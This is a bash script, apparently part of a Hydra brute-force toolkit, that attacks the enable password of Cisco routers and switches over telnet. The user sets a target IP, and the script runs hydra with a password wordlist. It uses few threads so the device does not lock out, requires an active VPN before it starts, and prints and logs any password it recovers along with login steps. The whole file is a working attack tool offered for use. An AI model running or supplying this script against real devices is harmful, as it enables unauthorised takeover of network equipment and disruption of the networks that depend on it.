#!/bin/bash

# Cisco AAA/Enable Password Attack Script
# Description: Attacks Cisco devices (routers/switches) enable password
# Usage: Edit TARGET variable and run

set -euo pipefail

# ============================================
# CONFIGURATION - EDIT ONLY THIS LINE
# ============================================
TARGET="192.168.1.1"  # <-- Change this to your Cisco device IP

# ============================================
# DO NOT EDIT BELOW THIS LINE
# ============================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

# Configuration
PROJECT_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
WORDLIST="${PROJECT_ROOT}/config/admin_passwords.txt"
PORT=23
THREADS=4  # Cisco devices are sensitive to connection floods
LOG_FILE="${HOME}/hydra-logs/cisco_$(date +%Y%m%d_%H%M%S).log"

# Banner
echo -e "${BLUE}"
echo "╔════════════════════════════════════════╗"
echo "║   Cisco Enable Password Attack        ║"
echo "║   Target: $TARGET"
echo "╚════════════════════════════════════════╝"
echo -e "${NC}"

# Check VPN
if [ -f "${PROJECT_ROOT}/scripts/vpn_check.sh" ]; then
    bash "${PROJECT_ROOT}/scripts/vpn_check.sh" || {
        echo -e "${YELLOW}[!] VPN not active${NC}"
        exit 1
    }
fi

# Check hydra
if ! command -v hydra &> /dev/null; then
    echo -e "${RED}[!] Hydra not found. Run: bash install.sh${NC}"
    exit 1
fi

# Check wordlist
if [ ! -f "$WORDLIST" ]; then
    echo -e "${RED}[!] Wordlist not found: $WORDLIST${NC}"
    exit 1
fi

# Create log directory
mkdir -p "$(dirname "$LOG_FILE")"

echo -e "${BLUE}[*] Starting Cisco attack...${NC}"
echo -e "${BLUE}[*] Target: $TARGET:$PORT${NC}"
echo -e "${BLUE}[*] Threads: $THREADS (low to avoid device lockout)${NC}"
echo -e "${YELLOW}[!] Note: Cisco devices may lockout after failed attempts${NC}"

# Run hydra attack for Cisco enable password
hydra -P "$WORDLIST" \
    -t "$THREADS" \
    -s "$PORT" \
    -f \
    -o "$LOG_FILE" \
    "$TARGET" \
    cisco-enable 2>&1 | while IFS= read -r line; do
    
    echo "$line"
    
    if echo "$line" | grep -q "password:"; then
        password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p')
        
        echo -e "${GREEN}[+] SUCCESS! Enable password found:${NC}"
        echo -e "${GREEN}    Password: $password${NC}"
        echo -e "${GREEN}[+] To use: telnet $TARGET, then 'enable' and enter password${NC}"
        
        if [ -f "${PROJECT_ROOT}/scripts/logger.sh" ]; then
            source "${PROJECT_ROOT}/scripts/logger.sh"
            save_result "cisco-enable" "$TARGET" "$PORT" "enable" "$password"
        fi
    fi
done

echo -e "${GREEN}[+] Attack completed!${NC}"
echo -e "${BLUE}[*] Results saved to: $LOG_FILE${NC}"
